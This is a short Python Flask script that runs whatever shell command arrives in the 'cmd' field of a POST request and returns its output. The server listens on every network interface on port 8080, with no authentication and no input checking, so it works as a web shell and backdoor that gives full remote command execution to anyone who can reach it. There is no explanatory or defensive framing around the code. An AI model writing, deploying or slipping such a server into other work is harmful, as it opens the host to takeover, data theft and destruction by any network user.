from flask import Flask, request
from subprocess import Popen, PIPE
import shlex
import os

app = Flask(__name__)

@app.route('/', methods=['POST'])
def cmd():
    cmd = request.form['cmd']
    process = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
    (output, error) = process.communicate()
    exit_code = process.wait()
    print(output)
    print(error)
    return output

app.run(host='0.0.0.0', port='8080')
